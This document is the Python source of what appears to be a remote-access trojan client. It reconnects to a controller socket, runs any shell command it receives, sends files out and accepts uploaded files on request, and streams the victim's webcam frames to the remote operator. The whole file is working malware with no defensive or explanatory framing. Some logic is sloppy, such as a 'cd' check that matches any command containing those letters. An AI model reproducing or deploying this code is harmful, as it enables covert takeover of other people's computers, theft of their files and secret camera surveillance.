import socket
import os
import subprocess
import cv2
import threading
import pickle
import time 

client = socket.socket()
IP = "localhost"
PORT = 9000
while True :
    try :
        client.connect((IP,PORT))
        break
    except:
        time.sleep(1)
        pass

end = False

def ext(socket ,vid):
    global end
    msg  = socket.recv(10).decode().strip()
    if msg == "end":
        end = True







percent = int()

def send_file(socket,file_name):
	client = socket
	data = b''
	file_size = os.stat(file_name).st_size

	f = open(file_name,'rb')
	data = f.read(file_size)
	f.close()
	file_size = os.stat(file_name).st_size
	client.send(str(file_size).ljust(20).encode())
	client.sendall(data)


def get_times(size):
	times =0
	max_size = 64*1024
	no_iterations = size/max_size
	if no_iterations <= 0:
		times = 1
	elif no_iterations <=20:
		times = 10
	else :
		times = 64
	return times


def get_file(client,filename):
    global percent ,get_pwd
    times = int()
    file_size = client.recv(20).decode()
    times = get_times(int(file_size))
    data =b''
    while True :
        k = "="*int(percent//5)
        st = k+">"
        print("downloading.."+" "*20+"["+st.ljust(20)+"]"+str(len(data))+"/"+file_size,end="\r")
        d = client.recv(times*1024)
        if not d:
            break 
        percent = len(data)*100//int(file_size)
        data += d
        u = len(data)
        if u >= int(file_size):
            data = data[:int(file_size)]
            print("downloading.."+" "*20+"["+st.ljust(20)+"]"+str(len(data))+"/"+file_size,end="\r")
            print()
            break	
    with open(filename,'wb') as k:
        k.write(data)





def live_cam(socket):
    global end
    client_socket = socket
    
    vid = cv2.VideoCapture(0)
    
    th = threading.Thread(target=ext,args=(client_socket,vid))
    th.start()
    while(vid.isOpened()):
        img,frame = vid.read()
        
        a = pickle.dumps(frame)
        msg_len = str(len(a)).ljust(10).encode()
        client_socket.sendall(msg_len+a)
        if end :
            vid.release()
			
			#have to recive in multi thread




class terminal:
    pwd =os.getcwd()
    ter = os 
    sub = subprocess
    def command(self,cmd):

        out = ''

        if 'cd' in cmd:
            cmd = cmd.split()[-1]
            try :
                self.ter.chdir(str(cmd))
                
            except :
                out = "no such directory"
            self.pwd = self.ter.getcwd()
        else:
            out1 = self.sub.Popen(cmd,stdout=subprocess.PIPE,shell =True)
            out = out1.communicate()[0]
            out = out.decode()

        return out

ter = terminal()



while True:
    client.send(str(len(ter.pwd)).ljust(10).encode())
    client.send(ter.pwd.encode())
    
    msg_len = int(client.recv(10).decode())
    msg =  client.recv(msg_len).decode()

    if msg == "exit":
        client.close()
        break
    if msg == "livecam":
        live_cam(client)

    elif "download" in msg :
        file_name = msg.split("-")[1].strip()
        send_file(client,file_name)
    elif "upload" in msg:
        file_name = msg.split("-")[1].strip()
        get_file(client,file_name)
    else:

        out = ter.command(msg)
        out_len = str(len(out)).ljust(10).encode()
        client.send(out_len)
        client.send(out.encode())

    
